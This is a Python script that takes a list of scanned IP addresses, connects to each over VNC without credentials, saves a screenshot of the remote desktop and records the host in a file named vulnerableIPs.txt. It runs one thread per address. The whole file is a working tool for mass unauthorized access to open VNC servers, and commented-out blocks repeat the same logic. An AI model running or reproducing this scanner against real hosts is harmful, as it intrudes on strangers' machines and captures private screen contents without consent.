import os
from subprocess import call
from vncapi import api
import os.path
import threading
from filelock import FileLock


def parseLine(line):

    parsedLine = line.split(" ")
    try:
        client = api.connect("{ip}:0".format(ip=parsedLine[3]))
        client.captureScreen('screenshot_IP_{ip}.png'.format(ip=parsedLine[3]))
        print('Got image from {ip}'.format(ip=parsedLine[3]))
        with FileLock("vulnerableIPs.txt"):
                with open('vulnerableIPs.txt', 'a') as file:
                    file.write(parsedLine[3])

    except:
        print('Cant get image from {ip}'.format(ip=parsedLine[3]))
        pass


    """
    parsedLine = line.split(" ")
    if parsedLine[0] == "open":
        #print("open at {ip}".format(ip=parsedLine[3]))
        try:
            #print("trying to connect to {ip}")
            client = api.connect('{ip}:0'.format(ip=parsedLine[3]))
            print("connected to {ip}")
            client.captureScreen('screenshot_IP_{ip}.png'.format(ip=parsedLine[3]))
            print("screenshot taken of {ip}".format(ip=parsedLine[3]))
            with FileLock("vulnerableIPs.txt"):
                with open('vulnerableIPs.txt', 'a') as file:
                    file.write(parsedLine[3])
        except:
            pass
            #print('Cant get image from {ip}'.format(ip=parsedLine[3]))
    """

def main():

    if os.path.isfile('ips.txt'):
        print('List of ips detected.')
        with open('ips.txt') as f:
            lines = f.readlines() # list containing lines of file
            for line in lines:
                print(line)
                thread = threading.Thread(target=parseLine,  kwargs={'line':line})
                thread.start()    


    """
    while True:
        lineCounter = 1
        if os.path.isfile('ips.txt'):
            with open("ips.txt") as f:
                print("hello")
                for line in f:
                    print(line)
                    if lineCounter >= startLine:
                        startLine += 1
                        thread = threading.Thread(target=parseLine,  kwargs={'line':line,'number':lineCounter})
                        thread.start()
                        wasShown = False
                        #parseLine(line,lineCounter)
                    else:
                        if not wasShown:
                            #print "No more to do\n"
                            wasShown = True
                    lineCounter += 1

    return 0
    """





if __name__ == '__main__':
    main()
